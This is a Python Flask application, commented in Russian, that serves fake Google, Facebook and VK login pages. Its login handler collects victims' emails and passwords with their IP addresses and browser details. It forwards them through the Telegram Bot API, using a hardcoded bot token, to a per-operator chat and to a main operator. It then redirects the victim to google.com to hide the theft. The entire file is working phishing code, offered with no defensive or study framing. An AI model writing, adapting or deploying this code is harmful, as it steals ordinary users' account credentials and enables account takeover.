from flask import Flask, render_template, request, redirect
import json
import requests
from datetime import datetime

app = Flask(__name__)

# Загрузка данных админов из файла
with open('admins.json', 'r') as f:
    admins = json.load(f)

# Главная страница
@app.route('/')
def index():
    return render_template('index.html')

# Страница входа через Google
@app.route('/login-google')
def login_google():
    return render_template('login-google.html')

# Страница входа через Facebook
@app.route('/login-facebook')
def login_facebook():
    return render_template('login-facebook.html')

# Страница входа через VK
@app.route('/login-vk')
def login_vk():
    return render_template('login-vk.html')

# Обработка входа
@app.route('/login', methods=['POST'])
def login():
    # Получаем данные из формы
    email = request.form.get('email')
    password = request.form.get('password')
    admin_key = request.form.get('admin_key')  # Ключ админа

    # Получаем информацию о пользователе
    user_ip = request.remote_addr
    user_agent = request.headers.get('User-Agent')
    current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    # Формируем сообщение для Telegram
    message = (
        f"Новый вход:\n"
        f"Время: {current_time}\n"
        f"IP: {user_ip}\n"
        f"User-Agent: {user_agent}\n"
        f"Email: {email}\n"
        f"Пароль: {password}"
    )

    # Отправляем данные в Telegram
    if admin_key in admins['admins']:
        user_id = admins['admins'][admin_key]['user_id']
        send_to_telegram(user_id, message)  # Отправка админу
        send_to_telegram("YOUR_CHAT_ID", message)  # Отправка главному админу (вам)

    # Перенаправление на оригинальный сайт
    return redirect("https://google.com")  # Замените на нужный сайт

# Функция отправки данных в Telegram
def send_to_telegram(chat_id, message):
    bot_token = "7728256968:AAEenNdOxdzfTtPMM5H-ILAAK9hNNzhBsP0"  # Токен вашего бота
    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    params = {
        "chat_id": chat_id,
        "text": message
    }
    requests.get(url, params=params)

if __name__ == '__main__':
    app.run(debug=True)